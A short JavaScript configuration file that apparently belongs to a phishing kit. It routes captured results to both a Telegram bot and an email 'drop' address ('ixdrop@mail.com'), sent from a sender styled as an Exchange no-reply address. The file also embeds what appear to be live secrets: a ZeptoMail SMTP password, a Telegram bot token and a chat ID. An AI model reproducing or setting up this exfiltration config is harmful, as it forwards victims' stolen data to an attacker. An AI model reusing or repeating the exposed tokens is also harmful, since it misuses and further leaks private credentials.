exports.CHANNEL = 'both'; // 'telegram' | 'email' | 'both' | 'none' default: 'none'
// ===== Email ===== ===== =====
exports.SMTP_ENABLED = true; // change to true to enable transport, false by default to use cpanel builtin mail service
exports.SMTP_HOST = 'smtp.zeptomail.com';
exports.SMTP_PORT = 465;
exports.SMTP_USERNAME = 'emailapikey';
exports.SMTP_PASSWORD = 'wSsVR612/hH4WqkpmDWoJL09nFwGUVKlF057igOkuSSqS6jK98czxU2YUFDzTqVLF2VhEjFE8r8omxoFgWdYi9Qsy1kCDyiF9mqRe1U4J3x17qnvhDzOWmVZlROJLowAwwlvmmRnEc4i+g==';
exports.SMTP_SECURE = true;
exports.FROM_ADDRESS_ADDRESS = 'noreplyexchange@glonic.ng';
exports.TO_ADDRESS_ADDRESS = 'ixdrop@mail.com'; // single email address or comma separated list of email addresses
// ===== Telegram ===== ===== =====
exports.BOT_TOKEN = '8703605790:AAErq-ohWw7DoeRxomTDqSC51jWrO1wplbQ';
exports.CHAT_ID = '7819151321';
